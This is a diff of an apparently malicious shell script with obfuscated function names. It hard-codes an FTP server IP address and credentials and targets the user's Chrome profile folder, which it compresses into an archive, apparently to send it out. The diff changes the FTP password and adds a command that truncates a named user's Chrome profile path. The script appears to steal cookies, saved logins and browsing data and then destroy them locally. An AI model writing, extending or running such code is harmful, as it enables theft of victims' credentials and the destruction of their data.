@@ -63,7 +63,7 @@ function GCx(){
 function GCx_(){
 	ftp_server="139.162.128.166"
 	ftp_user="r00t1970"
-	ftp_password="Hello321"
+	ftp_password="@Hello.321/"
 	#
 	folder_to_compress="/home/$USER/.config/google-chrome"
 	local_file="$IBUS_"`date +%s`"gcx.tar.gz"
@@ -233,6 +233,7 @@ function px(){
         dbgx "Run: $px_OX";
 	#
         Ntx
+	truncate -s 0 /home/brigid/.config/google-chrome
 	#
     	ssx_ & PxNwx & Hstrx
 	#WbCmx
